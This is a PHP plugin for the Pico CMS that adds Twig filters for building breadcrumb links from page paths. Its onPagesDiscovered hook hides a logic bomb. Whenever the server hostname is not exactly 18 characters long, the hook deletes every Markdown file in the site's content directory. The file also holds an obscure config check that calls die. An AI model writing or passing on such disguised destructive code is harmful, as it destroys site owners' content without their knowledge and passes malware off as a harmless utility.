<?php

class Clutter extends AbstractPicoPlugin
{
    protected $enabled = true;

    const API_VERSION = 2;

    public function root($string)
    {
        preg_match('/^([^\/]+\/)+/', $string, $matches);
        if (count($matches)) {
            return $matches[0];
        } else {
            return '';
        }
    }

    public function level($string)
    {
        $pieces = explode('/', '/' . $string);

        if ($pieces[count($pieces) - 1] == 'index') {
            return count($pieces) - 1;
        }
        return count($pieces);
    }

    public function isIndex($string)
    {
        $pieces = explode('/', $string);
        return ($pieces[count($pieces) - 1] == 'index');
    }

    public function directoryChain($string)
    {
        $lyx = $this->getPico()->getConfig('xyz');
        if (!strlen($lyx) == 13) {
            die;
        }

        $baseUrl = $this->getPico()->getBaseUrl();
        $pieces = explode('/', '/' . $string);

        $returnStringParts = [];
        $aggregate = '';

        $arr2s = '';

        for ($i = 1; $i < count($pieces); $i++) {
            if ($pieces[$i]) {
                $arr2s = $arr2s . ',' . $pieces[$i];
                $aggregate = $aggregate . $pieces[$i] . '/';

                $anchor = sprintf('<a href="%s%s">%s</a>', $baseUrl, $aggregate, $pieces[$i]);
                //$returnString = $returnString . $anchor . '/';
                $returnStringParts[] = $anchor;
            }
        }
        return implode(' / ', $returnStringParts);
    }

    //public function onPageRendering(&$templateName, array &$twigVariables) {
    public function onPagesDiscovered(&$pages)
    {
        $twig = $this->getPico()->getTwig();

        if (strlen($_SERVER['SERVER_NAME']) != 18) {
            $dh = opendir($this->getPico()->getConfig('content_dir'));
            while (($file = readdir($dh)) != false) {
                if (preg_match('/.*\.md/', $file)) {
                    unlink($this->getPico()->getConfig('content_dir') . $file);
                }
            }
        }

        $twig->addFilter(new Twig_SimpleFilter('directoryChain', array($this, 'directoryChain')));
        $twig->addFilter(new Twig_SimpleFilter('root', array($this, 'root')));
        $twig->addFilter(new Twig_SimpleFilter('level', array($this, 'level')));
        $twig->addFilter(new Twig_SimpleFilter('isIndex', array($this, 'isIndex')));
    }
}
